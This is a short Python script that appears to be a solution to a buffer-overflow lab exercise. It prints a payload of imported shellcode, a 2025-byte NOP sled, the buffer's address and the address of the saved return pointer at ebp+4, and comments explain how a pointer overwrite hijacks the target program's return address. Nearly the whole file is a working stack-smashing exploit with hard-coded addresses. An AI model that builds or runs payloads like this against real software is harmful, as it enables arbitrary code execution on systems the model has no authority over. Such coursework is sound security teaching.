from shellcode import shellcode
from struct import pack
#strncpy allows us to copy 2048 bytes.
#Given shellcode is 23 bytes
#We fill the rest of the buf with 2025 NOP, so that it adds up to 2048 bytes
#Then we put the address of the buf in the location of variable a
#Last we put the address of ebp+4 into the pointer variable *p, since (ebp+4) is where the return address is stored.
ebp = 0xbffed1b8
buf = 0xbffec9a8
# print shellcode + "\x90"*2025 + "\xa8\xc9\xfe\xbf" + "\xbc\xd1\xfe\xbf"
print shellcode + "\x90"*2025 + pack("<I", buf) + pack ("<I", ebp + 4)
